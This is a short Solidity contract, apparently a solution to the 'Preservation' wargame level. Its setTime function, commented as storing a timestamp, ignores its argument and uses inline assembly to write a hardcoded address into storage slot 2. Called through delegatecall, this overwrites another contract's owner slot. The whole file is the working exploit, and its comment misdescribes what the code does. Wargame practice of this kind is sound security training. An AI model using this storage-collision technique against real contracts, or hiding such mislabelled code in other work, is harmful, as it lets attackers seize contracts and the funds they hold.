// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BeatPreservation {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        assembly {
            sstore(2, 0xAB75E66C63307396FE8456Ea7c42CBBF3CF36298)
        }
    }
}
